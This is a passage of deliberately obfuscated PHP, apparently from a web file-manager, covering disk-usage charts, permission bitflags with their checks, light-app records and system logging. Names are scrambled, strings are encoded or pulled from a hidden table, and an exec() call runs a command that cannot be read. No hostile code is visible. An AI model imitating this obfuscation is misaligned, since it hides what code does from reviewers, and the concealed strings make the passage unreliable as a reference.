$A´ŒÊó½ù[$Cê®ÇêÕ…±[376]]); $f‡Ì–Îñë = Model($Cê®ÇêÕ…±[431])->where($F—İË°§à)->sum($Cê®ÇêÕ…±[87]); $EˆÑ½Ññº = explode($Cê®ÇêÕ…±[60], $_SERVER[$Cê®ÇêÕ…±[149]]); goto díáŠˆÇŠ¶; bå…µ¨Ô‰: if ($dùƒöåÅøî == $Cê®ÇêÕ…±[732]) { $D‘°Åôßà¸ = explode($Cê®ÇêÕ…±[1083], $eÊ¢‚ÉÖÆ[$Cê®ÇêÕ…±[893]]); $dùƒöåÅøî = $D‘°Åôßà¸[0]; } if ($dùƒöåÅøî == $Cê®ÇêÕ…±[735] || $dùƒöåÅøî == $Cê®ÇêÕ…±[736]) { $F¬óêùğÈ¶ = Model()->db()->query($Cê®ÇêÕ…±[2095]); $FßÉ‹Öæ‘ = $F¬óêùğÈ¶[0] && isset($F¬óêùğÈ¶[0][$Cê®ÇêÕ…±[1348]]) ? $F¬óêùğÈ¶[0][$Cê®ÇêÕ…±[1348]] : 0; $dùƒöåÅøî = $Cê®ÇêÕ…±[2096] . ($FßÉ‹Öæ‘ ? $Cê®ÇêÕ…±[18] . $FßÉ‹Öæ‘ : $Cê®ÇêÕ…±[43]); } $BÅ†‰ºî·å = $GLOBALS[$Cê®ÇêÕ…±[16]][$Cê®ÇêÕ…±[346]][$Cê®ÇêÕ…±[763]]; goto FÙº®ôŠŠØ; díáŠˆÇŠ¶: $cÉÀ§ò¹º = $EˆÑ½Ññº[0]; $eÊ¢‚ÉÖÆ = $GLOBALS[$Cê®ÇêÕ…±[16]][$Cê®ÇêÕ…±[27]]; $dùƒöåÅøî = $eÊ¢‚ÉÖÆ[$Cê®ÇêÕ…±[894]]; goto bå…µ¨Ô‰; d ÓÍ’‡: $Cê®ÇêÕ…± =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d°†èÚÄ¼Ğ = $this->diskDriver(); $A´ŒÊó½ù = KodIO::defaultDriver(); goto bçØ±ãÉòí; cëŞ ğ¬Œ: } private function diskDriver() { goto f×¿„Å§·•; f×¿„Å§·•: $Döë´õåÉË =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d×ëÖ¦”¢ù = $Döë´õåÉË[18]; $AÒäàÉã®§ = $GLOBALS[$Döë´õåÉË[16]][$Döë´õåÉË[2109]] == $Döë´õåÉË[2110]; goto cËÖÑ÷œŒî; D„õ­Ê‰ïØ: $d´½‘Ç§Ÿè = $CëãÀ”›Ò - @disk_free_space($d×ëÖ¦”¢ù); return array($Döë´õåÉË[2098] => $CëãÀ”›Ò, $Döë´õåÉË[2100] => $d´½‘Ç§Ÿè); goto cò‡Üè©İÂ; cËÖÑ÷œŒî: if ($AÒäàÉã®§) { $d×ëÖ¦”¢ù = $Döë´õåÉË[2111]; if (function_exists($Döë´õåÉË[2112])) { exec($Döë´õåÉË[2113], $FçÕ¦â‰œ…); $d×ëÖ¦”¢ù = $FçÕ¦â‰œ…[1] . $Döë´õåÉË[18]; } } if (!file_exists($d×ëÖ¦”¢ù)) { return; } $CëãÀ”›Ò = @disk_total_space($d×ëÖ¦”¢ù); goto D„õ­Ê‰ïØ; cò‡Üè©İÂ: } public function fileChart($bÓ§¥¶¸Ç) { goto c²Ş”“²‹à; fô¬–ò¼ˆê: $cæéÑƒà§ã = $this->sourceSize(); $EÅÀ„ƒòæó = array($aˆÈõÌ™àÖ[472] => 0, $aˆÈõÌ™àÖ[380] => 1); $c˜‰Ö¸ùÉ‘ = Model($aˆÈõÌ™àÖ[761])->where($EÅÀ„ƒòæó)->sum($aˆÈõÌ™àÖ[87]); goto D¢Šßë˜–; D¢Šßë˜–: $EÅÀ„ƒòæó[$aˆÈõÌ™àÖ[380]] = 2; $càè„º¼É› = Model($aˆÈõÌ™àÖ[761])->where($EÅÀ„ƒòæó)->sum($aˆÈõÌ™àÖ[87]); return array($aˆÈõÌ™àÖ[707] => $cæéÑƒà§ã[$aˆÈõÌ™àÖ[87]], $aˆÈõÌ™àÖ[2044] => $cæéÑƒà§ã[$aˆÈõÌ™àÖ[2044]], $aˆÈõÌ™àÖ[2045] => (int) $c˜‰Ö¸ùÉ‘, $aˆÈõÌ™àÖ[2046] => (int) $càè„º¼É›); goto A»‡ãÀÈ¬²; c²Ş”“²‹à: $aˆÈõÌ™àÖ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (isset($bÓ§¥¶¸Ç[$aˆÈõÌ™àÖ[1443]])) { return Model($aˆÈõÌ™àÖ[761])->userFileTypeProfile($bÓ§¥¶¸Ç[$aˆÈõÌ™àÖ[1443]]); } if (isset($bÓ§¥¶¸Ç[$aˆÈõÌ™àÖ[2114]])) { return Model($aˆÈõÌ™àÖ[761])->groupFileTypeProfile($bÓ§¥¶¸Ç[$aˆÈõÌ™àÖ[2114]]); } goto fô¬–ò¼ˆê; A»‡ãÀÈ¬²: } private function sourceSize() { $d„í†¢¹Ø’ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cá™ÒôØ¬Ï = Model($d„í†¢¹Ø’[761])->where(array($d„í†¢¹Ø’[379] => 0))->sum($d„í†¢¹Ø’[87]); $Cò©¦¬Ÿ§ğ = Model($d„í†¢¹Ø’[431])->sum($d„í†¢¹Ø’[87]); if ($Cò©¦¬Ÿ§ğ > $cá™ÒôØ¬Ï) { $Cò©¦¬Ÿ§ğ = $cá™ÒôØ¬Ï; } return array($d„í†¢¹Ø’[87] => (int) $cá™ÒôØ¬Ï, $d„í†¢¹Ø’[2044] => (int) $Cò©¦¬Ÿ§ğ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $A–…¨™ÀÍ˜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Cäìä‹™»¬ = array(array($A–…¨™ÀÍ˜[395] => LNG($A–…¨™ÀÍ˜[2115]), $A–…¨™ÀÍ˜[2116] => $A–…¨™ÀÍ˜[2117], $A–…¨™ÀÍ˜[2118] => 6, $A–…¨™ÀÍ˜[2119] => 1, $A–…¨™ÀÍ˜[2120] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($A–…¨™ÀÍ˜[395] => LNG($A–…¨™ÀÍ˜[2121]), $A–…¨™ÀÍ˜[2116] => $A–…¨™ÀÍ˜[2122], $A–…¨™ÀÍ˜[2118] => 1, $A–…¨™ÀÍ˜[2119] => 1, $A–…¨™ÀÍ˜[2120] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($A–…¨™ÀÍ˜[395] => LNG($A–…¨™ÀÍ˜[2123]), $A–…¨™ÀÍ˜[2116] => $A–…¨™ÀÍ˜[2124], $A–…¨™ÀÍ˜[2118] => 2, $A–…¨™ÀÍ˜[2119] => 1, $A–…¨™ÀÍ˜[2120] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($A–…¨™ÀÍ˜[395] => LNG($A–…¨™ÀÍ˜[2125]), $A–…¨™ÀÍ˜[2116] => $A–…¨™ÀÍ˜[2124], $A–…¨™ÀÍ˜[2118] => 3, $A–…¨™ÀÍ˜[2119] => 1, $A–…¨™ÀÍ˜[2120] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($A–…¨™ÀÍ˜[395] => LNG($A–…¨™ÀÍ˜[2126]), $A–…¨™ÀÍ˜[2116] => $A–…¨™ÀÍ˜[2127], $A–…¨™ÀÍ˜[2118] => 4, $A–…¨™ÀÍ˜[2119] => 1, $A–…¨™ÀÍ˜[2120] => self::AUTH_SHOW | self::AUTH_VIEW), array($A–…¨™ÀÍ˜[395] => LNG($A–…¨™ÀÍ˜[2128]), $A–…¨™ÀÍ˜[2116] => $A–…¨™ÀÍ˜[2129], $A–…¨™ÀÍ˜[2118] => 5, $A–…¨™ÀÍ˜[2119] => 1, $A–…¨™ÀÍ˜[2120] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($A–…¨™ÀÍ˜[395] => LNG($A–…¨™ÀÍ˜[2130]), $A–…¨™ÀÍ˜[2116] => $A–…¨™ÀÍ˜[2131], $A–…¨™ÀÍ˜[2118] => 7, $A–…¨™ÀÍ˜[2119] => 1, $A–…¨™ÀÍ˜[2120] => 0)); return $Cäìä‹™»¬; } public static function authCheck($eõÚ£â÷â’, $BÎ÷­ğ³á) { $eõÚ£â÷â’ = intval($eõÚ£â÷â’); if (_get($GLOBALS, $_SERVER[çŞáÓæÚô‚Ô‡][468])) { return !0; } if ($eõÚ£â÷â’ <= 0) { return !1; } if (($eõÚ£â÷â’ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($eõÚ£â÷â’ & $BÎ÷­ğ³á); } public static function authCheckShow($bœ¬“ê©ÊÕ) { return self::authCheck($bœ¬“ê©ÊÕ, self::AUTH_SHOW); } public static function authCheckView($díğ»Á‘à¢) { return self::authCheck($díğ»Á‘à¢, self::AUTH_VIEW); } public static function authCheckDownload($eâéì‚Ë½õ) { return self::authCheck($eâéì‚Ë½õ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($eˆ±½ì˜È¯) { return self::authCheck($eˆ±½ì˜È¯, self::AUTH_UPLOAD); } public static function authCheckEdit($Cæõ²£ˆöÌ) { return self::authCheck($Cæõ²£ˆöÌ, self::AUTH_EDIT); } public static function authCheckRemove($EæâŸ‚ß·Œ) { return self::authCheck($EæâŸ‚ß·Œ, self::AUTH_REMOVE); } public static function authCheckShare($C¼å×¤Âº¤) { return self::authCheck($C¼å×¤Âº¤, self::AUTH_SHARE); } public static function authCheckComment($DÚÔ¤¶õ†ë) { return self::authCheck($DÚÔ¤¶õ†ë, self::AUTH_COMMENT); } public static function authCheckEvent($C¹ñìÌÔ´) { return self::authCheck($C¹ñìÌÔ´, self::AUTH_EVENT); } public static function authCheckRoot($Bä‹·Ä×ÉÒ) { return self::authCheck($Bä‹·Ä×ÉÒ, self::AUTH_ROOT); } public static function authCheckAction($fìá™£Û®¬, $Cëî•Ó·â¥) { goto FÓÊ™ƒ­; FÓÊ™ƒ­: $d•ğ°¸¼Ù¾ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Aã‹öæëÆä = array($d•ğ°¸¼Ù¾[2132] => self::AUTH_VIEW, $d•ğ°¸¼Ù¾[1047] => self::AUTH_DOWNLOAD, $d•ğ°¸¼Ù¾[113] => self::AUTH_UPLOAD, $d•ğ°¸¼Ù¾[2081] => self::AUTH_EDIT, $d•ğ°¸¼Ù¾[2080] => self::AUTH_REMOVE, $d•ğ°¸¼Ù¾[2091] => self::AUTH_SHARE, $d•ğ°¸¼Ù¾[350] => self::AUTH_COMMENT, $d•ğ°¸¼Ù¾[1431] => self::AUTH_EVENT, $d•ğ°¸¼Ù¾[1569] => self::AUTH_ROOT); if (!isset($Aã‹öæëÆä[$Cëî•Ó·â¥])) { return; } goto bè³¦Íä×Á; bè³¦Íä×Á: $F“¥™øÑĞ¢ = $Aã‹öæëÆä[$Cëî•Ó·â¥]; $fìá™£Û®¬ = intval($fìá™£Û®¬); if ($fìá™£Û®¬ <= 0) { return !1; } goto B¯™…º¹; B¯™…º¹: if (($fìá™£Û®¬ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($fìá™£Û®¬ & $F“¥™øÑĞ¢); goto a¸Ô£®Îã°; a¸Ô£®Îã°: } public static function authDisable($D¬ÛƒÅ¢°, $d‰¬Ğ‹Öš») { if (intval($D¬ÛƒÅ¢°) <= 0) { return 0; } return intval($D¬ÛƒÅ¢°) & ~$d‰¬Ğ‹Öš»; } public $optionType = "\123\x79\x73\164\145\x6d\56\x73\157\165\162\x63\145\x41\165\164\x68\x4c\x69\163\164"; public $field = array("\x6e\x61\155\145", "\x61\165\x74\x68", "\154\x61\142\x65\154", "\144\151\x73\160\154\x61\x79", "\x73\171\x73\x74\145\x6d", "\x73\157\162\x74"); public function initData() { $BâñÌá…š = $this->authDefault(); foreach ($BâñÌá…š as $A¿Œù®ÜÕ‡) { $this->add($A¿Œù®ÜÕ‡); } } public function listData($B…ì—´¢ = false, $CâÃ¼ç½•ì = "\163\x6f\162\x74", $a´ø‡ìçç = false) { return parent::listData($B…ì—´¢, $CâÃ¼ç½•ì, $a´ø‡ìçç); } public function update($Fª§ÑÌôÜº, $f»ö¤ÕÔŒ—) { $DŠà…›Å†å =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EÆ¨Û Å² = parent::listData($Fª§ÑÌôÜº); $CÕÄÈœ—£… = $this->findByName($f»ö¤ÕÔŒ—[$DŠà…›Å†å[38]]); if (!$EÆ¨Û Å² || $CÕÄÈœ—£… && $CÕÄÈœ—£…[$DŠà…›Å†å[376]] != $EÆ¨Û Å²[$DŠà…›Å†å[376]]) { return !1; } $this->filterAuth($f»ö¤ÕÔŒ—[$DŠà…›Å†å[385]]); return parent::update($Fª§ÑÌôÜº, $f»ö¤ÕÔŒ—); } public function remove($F–½¸šÇÎ¼) { $AŸ¨’ƒŠŠ  = parent::listData($F–½¸šÇÎ¼); if (!$AŸ¨’ƒŠŠ  || $AŸ¨’ƒŠŠ [$_SERVER[çŞáÓæÚô‚Ô‡][1087]]) { return !1; } return parent::remove($F–½¸šÇÎ¼); } public function add($DÎé«÷Õ Ş = array()) { goto a¯Š¾ –’à; e‰ÇÚ¤‰‡°: $DÎé«÷Õ Ş = array_merge($C¹ñá‹µ‡, $DÎé«÷Õ Ş); $DÎé«÷Õ Ş[$EïÄêº ¯ù[2136]] = $this->getSort(); $this->filterAuth($DÎé«÷Õ Ş[$EïÄêº ¯ù[385]]); goto c¹…‘ÄĞóõ; c¹…‘ÄĞóõ: return parent::insert($DÎé«÷Õ Ş); goto dÈÀ³ƒ×ÉÈ; a¯Š¾ –’à: $EïÄêº ¯ù =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($this->findByName($DÎé«÷Õ Ş[$EïÄêº ¯ù[38]])) { return !1; } $C¹ñá‹µ‡ = array($EïÄêº ¯ù[38] => $EïÄêº ¯ù[43], $EïÄêº ¯ù[385] => 1, $EïÄêº ¯ù[2133] => $EïÄêº ¯ù[2134], $EïÄêº ¯ù[2135] => 1, $EïÄêº ¯ù[1087] => 0, $EïÄêº ¯ù[2136] => 0); goto e‰ÇÚ¤‰‡°; dÈÀ³ƒ×ÉÈ: } private function getSort() { $A½ÈÊšÙÙ´ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E¶¨…«¬ø· = parent::listData(); $Cõ­œìª¹º = array_to_keyvalue($E¶¨…«¬ø·, $A½ÈÊšÙÙ´[43], $A½ÈÊšÙÙ´[2136]); return empty($Cõ­œìª¹º) ? 0 : max($Cõ­œìª¹º) + 1; } private function filterAuth(&$dÔâ†Ø‚äğ) { goto a’¥Ë©òÈ; DÊËáæÔ…: foreach ($AæÅµìÇ‚ as $bÖí¾¤) { if (isset($F†À™¾¸¯[$bÖí¾¤])) { $AæÅµìÇ‚ = array_merge($AæÅµìÇ‚, $F†À™¾¸¯[$bÖí¾¤]); } } $AæÅµìÇ‚[] = self::AUTH_SHOW; $dÔâ†Ø‚äğ = array_sum(array_unique($AæÅµìÇ‚)); goto DäŒ©Ÿ”Ã•; aìíÎ¦÷ì–: foreach ($aÅ«àğŞ™Ê as $bÖí¾¤) { if ($dÔâ†Ø‚äğ & $bÖí¾¤) { $AæÅµìÇ‚[] = $bÖí¾¤; } } if (in_array(self::AUTH_ROOT, $AæÅµìÇ‚)) { $dÔâ†Ø‚äğ = array_sum($aÅ«àğŞ™Ê); return; } $F†À™¾¸¯ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto DÊËáæÔ…; a’¥Ë©òÈ: if (!$dÔâ†Ø‚äğ) { return; } $aÅ«àğŞ™Ê = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $AæÅµìÇ‚ = array(); goto aìíÎ¦÷ì–; DäŒ©Ÿ”Ã•: } public function sort($c¹……È„šÇ, $aé‰­ÛÈ) { return parent::update($c¹……È„šÇ, $aé‰­ÛÈ); } } goto a•â‘â·; F›º§İÇâİ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\x2e\114\x69\147\150\x74\101\x70\160"; public $modelType = "\x53\171\163\x74\x65\x6d\117\160\164\x69\x6f\x6e"; public $field = array("\x6e\141\155\145", "\x67\x72\x6f\165\x70", "\144\145\163\x63", "\143\x6f\156\164\x65\156\x74"); public function listData($eïÕ×©³ÆÌ = false, $b¸³öÖŠ‘ = "\x6d\x6f\x64\x69\x66\x79\124\151\155\145", $bÎ³ŠÌÄÚˆ = true) { return parent::listData($eïÕ×©³ÆÌ, $b¸³öÖŠ‘, $bÎ³ŠÌÄÚˆ); } public function remove($BîÃÕ¼ÅÈƒ) { $EÌéÕŒßø‹ = $this->findByName($BîÃÕ¼ÅÈƒ); if (!$EÌéÕŒßø‹) { return !1; } return parent::remove($EÌéÕŒßø‹[$_SERVER[çŞáÓæÚô‚Ô‡][376]]); } public function add($eãå±±ŠãÄ) { if ($this->findByName($eãå±±ŠãÄ[$_SERVER[çŞáÓæÚô‚Ô‡][38]])) { return !1; } return parent::insert($eãå±±ŠãÄ); } public function update($cÌÔ®õßË, $cÓÛâš…¨‡) { $d¤”ê¬Õ†µ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÏÍæÇ”Ò = $this->findByName($cÌÔ®õßË); $E§˜“Š˜¾ = $this->findByName($cÓÛâš…¨‡[$d¤”ê¬Õ†µ[38]]); if (!$BÏÍæÇ”Ò || $E§˜“Š˜¾ && $E§˜“Š˜¾[$d¤”ê¬Õ†µ[376]] != $BÏÍæÇ”Ò[$d¤”ê¬Õ†µ[376]]) { return !1; } return parent::update($BÏÍæÇ”Ò[$d¤”ê¬Õ†µ[376]], $cÓÛâš…¨‡); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\164\145\155\137\x6c\157\147"; protected $dataAuto = array(array("\x63\162\145\x61\164\x65\x54\x69\155\x65", "\164\x69\x6d\145", "\151\x6e\x73\x65\162\x74", "\146\165\156\x63\164\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $D’Ï»ÕØµ¬ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return array($D’Ï»ÕØµ¬[2419] => LNG($D’Ï»ÕØµ¬[2420]), $D’Ï»ÕØµ¬[2421] => LNG($D’Ï»ÕØµ¬[2422]), $D’Ï»ÕØµ¬[2053] => LNG($D’Ï»ÕØµ¬[2423]), $D’Ï»ÕØµ¬[2424] => LNG($D’Ï»ÕØµ¬[2425]), $D’Ï»ÕØµ¬[2426] => LNG($D’Ï»ÕØµ¬[2427]), $D’Ï»ÕØµ¬[2428] => LNG($D’Ï»ÕØµ¬[2429]), $D’Ï»ÕØµ¬[2430] => LNG($D’Ï»ÕØµ¬[2431]), $D’Ï»ÕØµ¬[2432] => LNG($D’Ï»ÕØµ¬[2433]), $D’Ï»ÕØµ¬[2084] => LNG($D’Ï»ÕØµ¬[2434]), $D’Ï»ÕØµ¬[2085] => LNG($D’Ï»ÕØµ¬[2435]), $D’Ï»ÕØµ¬[2436] => LNG($D’Ï»ÕØµ¬[2437]), $D’Ï»ÕØµ¬[2438] => LNG($D’Ï»ÕØµ¬[2439]), $D’Ï»ÕØµ¬[2440] => LNG($D’Ï»ÕØµ¬[2441]), $D’Ï»ÕØµ¬[2442] => LNG($D’Ï»ÕØµ¬[2443]), $D’Ï»ÕØµ¬[2082] => LNG($D’Ï»ÕØµ¬[2444]), $D’Ï»ÕØµ¬[2089] => LNG($D’Ï»ÕØµ¬[2445]), $D’Ï»ÕØµ¬[2446] => LNG($D’Ï»ÕØµ¬[2447]), $D’Ï»ÕØµ¬[2448] => LNG($D’Ï»ÕØµ¬[2449]), $D’Ï»ÕØµ¬[2450] => LNG($D’Ï»ÕØµ¬[2451]), $D’Ï»ÕØµ¬[2452] => LNG($D’Ï»ÕØµ¬[2453]), $D’Ï»ÕØµ¬[2092] => LNG($D’Ï»ÕØµ¬[2454]), $D’Ï»ÕØµ¬[2093] => LNG($D’Ï»ÕØµ¬[2455]), $D’Ï»ÕØµ¬[2456] => LNG($D’Ï»ÕØµ¬[2457]), $D’Ï»ÕØµ¬[2458] => LNG($D’Ï»ÕØµ¬[2459]), $D’Ï»ÕØµ¬[2460] => LNG($D’Ï»ÕØµ¬[2461]), $D’Ï»ÕØµ¬[2087] => LNG($D’Ï»ÕØµ¬[2462]), $D’Ï»ÕØµ¬[2463] => LNG($D’Ï»ÕØµ¬[2464]), $D’Ï»ÕØµ¬[2086] => LNG($D’Ï»ÕØµ¬[2465]), $D’Ï»ÕØµ¬[2466] => LNG($D’Ï»ÕØµ¬[2467]), $D’Ï»ÕØµ¬[2468] => LNG($D’Ï»ÕØµ¬[2469]), $D’Ï»ÕØµ¬[2470] => LNG($D’Ï»ÕØµ¬[2470]), $D’Ï»ÕØµ¬[2471] => LNG($D’Ï»ÕØµ¬[2057]), $D’Ï»ÕØµ¬[2472] => LNG($D’Ï»ÕØµ¬[2473]), $D’Ï»ÕØµ¬[2474] => LNG($D’Ï»ÕØµ¬[2475]), $D’Ï»ÕØµ¬[2476] => LNG($D’Ï»ÕØµ¬[2477]), $D’Ï»ÕØµ¬[2478] => LNG($D’Ï»ÕØµ¬[2479]), $D’Ï»ÕØµ¬[2480] => LNG($D’Ï»ÕØµ¬[2481]), $D’Ï»ÕØµ¬[2482] => LNG($D’Ï»ÕØµ¬[2482]), $D’Ï»ÕØµ¬[2483] => LNG($D’Ï»ÕØµ¬[2484]), $D’Ï»ÕØµ¬[2485] => LNG($D’Ï»ÕØµ¬[2486]), $D’Ï»ÕØµ¬[2487] => LNG($D’Ï»ÕØµ¬[2488]), $D’Ï»ÕØµ¬[2489] => LNG($D’Ï»ÕØµ¬[2490]), $D’Ï»ÕØµ¬[2491] => LNG($D’Ï»ÕØµ¬[2492]), $D’Ï»ÕØµ¬[2493] => LNG($D’Ï»ÕØµ¬[2494])); } private function typeFile() { $CØ³Úœëï› =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b˜šß’È®ƒ = array($CØ³Úœëï›[2089] => array($CØ³Úœëï›[2090]), $CØ³Úœëï›[2440] => array($CØ³Úœëï›[2495]), $CØ³Úœëï›[2442] => array($CØ³Úœëï›[2496]), $CØ³Úœëï›[2082] => array($CØ³Úœëï›[2083]), $CØ³Úœëï›[2448] => array(), $CØ³Úœëï›[2450] => array(), $CØ³Úœëï›[2452] => array(), $CØ³Úœëï›[2092] => array($CØ³Úœëï›[2094]), $CØ³Úœëï›[2093] => array($CØ³Úœëï›[2094]), $CØ³Úœëï›[2456] => array($CØ³Úœëï›[2497]), $CØ³Úœëï›[2458] => array($CØ³Úœëï›[2497]), $CØ³Úœëï›[2460] => array($CØ³Úœëï›[2498]), $CØ³Úœëï›[2446] => array($CØ³Úœëï›[2499]), $CØ³Úœëï›[2087] => array($CØ³Úœëï›[2500]), $CØ³Úœëï›[2463] => array($CØ³Úœëï›[2501]), $CØ³Úœëï›[2086] => array($CØ³Úœëï›[2088])); return $b˜šß’È®ƒ; } private function typeAll() { goto d¸ëŞ†èè–; d¸ëŞ†èè–: $D«ÎˆâÀ»„ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C¬ïÂğ©“» = $this->typeList; $Cõ°×îß‘ = array_filter($this->typeFile()); goto cİ”àÏç«ˆ; cİ”àÏç«ˆ: foreach ($Cõ°×îß‘ as $A±ªàŒƒÚê => $c«ƒ¶–¦½ƒ) { $C¬ïÂğ©“»[$c«ƒ¶–¦½ƒ[0]] = $C¬ïÂğ©“»[$A±ªàŒƒÚê]; } $C¬ïÂğ©“»[$D«ÎˆâÀ»„[2094]] = LNG($D«ÎˆâÀ»„[2502]); $C¬ïÂğ©“»[$D«ÎˆâÀ»„[2497]] = LNG($D«ÎˆâÀ»„[2503]); goto c·Ì²©¢å; c·Ì²©¢å: return $C¬ïÂğ©“»; goto D²Ä‰¦´Î; D²Ä‰¦´Î: } public function addLog($FØá¡†Á, $D¹†‘ŒÏÊ = array()) { goto cİ‹…Éª…§; dÜ–¸ÅÓ´: if (!$bÀÂœ„î¯™) { $bÀÂœ„î¯™ = (int) Session::get($B‡½²ğ†¯·[2234]); } $a¶¤Ñ‰Ø–È = get_client_ip(); if (!$D¹†‘ŒÏÊ || strlen(json_encode($D¹†‘ŒÏÊ)) >= 1024) { $D¹†‘ŒÏÊ = array($B‡½²ğ†¯·[2504] => $a¶¤Ñ‰Ø–È); } else { if (is_array($D¹†‘ŒÏÊ)) { $D¹†‘ŒÏÊ[$B‡½²ğ†¯·[2504]] = $a¶¤Ñ‰Ø–È; } else { $D¹†‘ŒÏÊ = array($B‡½²ğ†¯·[1041] => $D¹†‘ŒÏÊ, $B‡½²ğ†¯·[2504] => $a¶¤Ñ‰Ø–È); } } goto dœ¿õ¸ÌÒæ; dœ¿õ¸ÌÒæ: $D¹†‘ŒÏÊ = array($B‡½²ğ†¯·[1433] => Session::sign(), $B‡½²ğ†¯·[1434] => $bÀÂœ„î¯™, $B‡½²ğ†¯·[39] => $FØá¡†Á, $B‡½²ğ†¯·[1436] => json_encode($D¹†‘ŒÏÊ)); parent::add($D¹†‘ŒÏÊ); goto e†ŒŠ—ë„Ú; cİ‹…Éª…§: $B‡½²ğ†¯· =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!isset($this->typeList[$FØá¡†Á])) { return; } $bÀÂœ„î¯™ = defined($B‡½²ğ†¯·[436]) && USER_ID ? USER_ID : (isset($D¹†‘ŒÏÊ[$B‡½²ğ†¯·[1443]]) ? $D¹†‘ŒÏÊ[$B‡½²ğ†¯·[1443]] : 0); goto dÜ–¸ÅÓ´; e†ŒŠ—ë„Ú: } public function remove($c±ŒƒŠ–¨) { $this->where(array($_SERVER[çŞáÓæÚô‚Ô‡][394] => $c±ŒƒŠ–¨))->delete(); } private function _makeOrder($Dó™Ô®Œ® = '') { goto e¤çé÷ ø; aäºÍ…Ò„è: $FÆâïÊ¨‹ = Input::get($Eä­õçˆ[417], $Eä­õçˆ[17], $Eä­õçˆ[2268], array($Eä­õçˆ[2194], $Eä­õçˆ[413])); $FÆâïÊ¨‹ = $D®“­£¦º[$FÆâïÊ¨‹]; $Dó™Ô®Œ® = $Dó™Ô®Œ® . "{$aŒÙêÕ²’}\x20{$FÆâïÊ¨‹}"; goto DÇï‰¤…; e¤çé÷ ø: $Eä­õçˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $aŒÙêÕ²’ = $Eä­õçˆ[197]; $D®“­£¦º = array($Eä­õçˆ[411] => $Eä­õçˆ[412], $Eä­õçˆ[413] => $Eä­õçˆ[414]); goto aäºÍ…Ò„è; DÇï‰¤…: return $this->order($Dó™Ô®Œ®); goto F…‘İäƒø; F…‘İäƒø: } public function get($CÔİåÖåïµ = '') { goto eùäÂœÄù; eİŠõé÷Î: $C›ƒËŸ¼¢Œ[$d‡«ÇÜ„Î½[363]] = $this->logList($C›ƒËŸ¼¢Œ[$d‡«ÇÜ„Î½[363]]); return $C›ƒËŸ¼¢Œ; goto F™­‘Ó¨‚‰; aÏŠæ°ä¿: if (!empty($CÔİåÖåïµ[$d‡«ÇÜ„Î½[2504]])) { $Aì˜½ñ¹À[$d‡«ÇÜ„Î½[414]] = array($d‡«ÇÜ„Î½[760], "\45{$CÔİåÖåïµ[$d‡«ÇÜ„Î½[2504]]}\x25"); } $C›ƒËŸ¼¢Œ = $this->_makeOrder()->where($Aì˜½ñ¹À)->selectPage(); if (empty($C›ƒËŸ¼¢Œ[$d‡«ÇÜ„Î½[363]])) { show_json(array(), !0, $C›ƒËŸ¼¢Œ[$d‡«ÇÜ„Î½[360]]); } goto eİŠõé÷Î; bàŸ¦ğïè: if ($CÔİåÖåïµ[$d‡«ÇÜ„Î½[1443]]) { $Aì˜½ñ¹À[$d‡«ÇÜ„Î½[1443]] = $CÔİåÖåïµ[$d‡«ÇÜ„Î½[1443]]; } if (isset($CÔİåÖåïµ[$d‡«ÇÜ„Î½[711]])) { $f½õê¬Ç¤  = $CÔİåÖåïµ[$d‡«ÇÜ„Î½[711]]; $Dï²óğö‘• = isset($CÔİåÖåïµ[$d‡«ÇÜ„Î½[458]]) ? 